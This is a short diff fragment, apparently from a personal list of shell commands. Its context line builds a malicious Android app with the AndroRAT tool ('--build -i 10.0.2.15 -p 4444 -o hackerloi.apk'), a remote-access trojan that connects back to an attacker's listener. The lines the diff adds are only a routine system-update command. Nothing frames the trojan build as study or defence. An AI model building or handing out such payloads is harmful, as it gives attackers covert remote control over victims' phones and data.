@@ -7,3 +7,7 @@ python3 androRAT.py --build -i 10.0.2.15 -p 4444 -o hackerloi.apk
 
 
 ls -la /tmp/
+
+
+apt update && apt upgrade
+
